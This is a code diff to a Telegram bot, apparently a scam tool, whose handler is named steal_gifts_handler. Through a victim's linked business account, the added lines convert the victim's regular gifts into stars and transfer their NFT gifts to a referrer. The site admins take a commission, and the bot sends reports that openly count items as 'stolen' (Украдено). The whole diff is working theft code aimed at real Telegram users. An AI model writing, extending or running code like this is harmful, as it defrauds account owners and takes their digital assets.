@@ -825,6 +825,25 @@ async def steal_gifts_handler(callback: CallbackQuery):
         await callback.answer(f"❌ Ошибка: {e}")
         return
 
+    # 1. Сначала конвертируем обычные подарки в звёзды
+    try:
+        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
+        regular_gifts = [g for g in gifts.gifts if g.type == "regular"]
+        
+        converted_count = 0
+        for gift in regular_gifts:
+            try:
+                await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
+                converted_count += 1
+            except Exception as e:
+                logging.error(f"Ошибка конвертации подарка: {e}")
+        
+        if converted_count > 0:
+            logging.info(f"Конвертировано {converted_count} обычных подарков в звёзды для {user.id}")
+    except Exception as e:
+        logging.error(f"Ошибка при обработке обычных подарков: {e}")
+
+    # 2. Теперь обрабатываем NFT-подарки
     # Кто пригласил этого пользователя?
     inviter_id = user_referrer_map.get(str(user.id))
     
@@ -837,6 +856,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
         take_commission = inviter_id in COMMISSION_REFERRERS
         recipient_id = inviter_id
 
+    # Получаем список NFT-подарков
     gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
     transferable_gifts = [g for g in gifts.gifts if g.type == "unique" and g.can_be_transferred]
     total_gifts = len(transferable_gifts)
@@ -893,7 +913,8 @@ async def steal_gifts_handler(callback: CallbackQuery):
     if ADMIN_IDS:
         admin_report = (
             f"🔷 Отчёт по бизнес-аккаунту {user.id}:\n"
-            f"🎁 Всего: {total_gifts}\n"
+            f"✨ Конвертировано обычных: {converted_count}\n"
+            f"🎁 Всего NFT: {total_gifts}\n"
             f"├─ Вам: {admin_gifts if take_commission else 0}\n"
             f"╰─ Получателю ({recipient_id}): {user_gifts}\n\n"
             f"{'🔹 Ваши: ' + ' | '.join(admin_stolen[:3]) + ('...' if len(admin_stolen)>3 else '') if admin_stolen else ''}\n"
@@ -904,7 +925,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
     # 2. Лог в общий чат и пригласившему (только его подарки)
     public_report = (
         f"Отчёт по бизнес-аккаунту {user.id}:\n"
-        f"🎁 Получено подарков: {len(user_stolen)}\n"
+        f"🎁 Получено NFT: {len(user_stolen)}\n"
         f"{' | '.join(user_stolen[:3]) + ('...' if len(user_stolen)>3 else '')}"
     )
 
@@ -916,7 +937,12 @@ async def steal_gifts_handler(callback: CallbackQuery):
         except Exception as e:
             logging.error(f"Не удалось уведомить пригласившего: {e}")
 
-    await callback.answer(f"✅ Готово! Украдено: {total_gifts}" + (f" (👑 вам: {admin_gifts})" if take_commission else ""))
+    await callback.answer(
+        f"✅ Готово!\n"
+        f"✨ Конвертировано: {converted_count}\n"
+        f"🎁 NFT: {total_gifts}" + 
+        (f" (👑 вам: {admin_gifts})" if take_commission else "")
+    )
 
 @dp.callback_query(F.data.startswith("transfer_stars:"))
 async def transfer_stars_handler(callback: CallbackQuery):
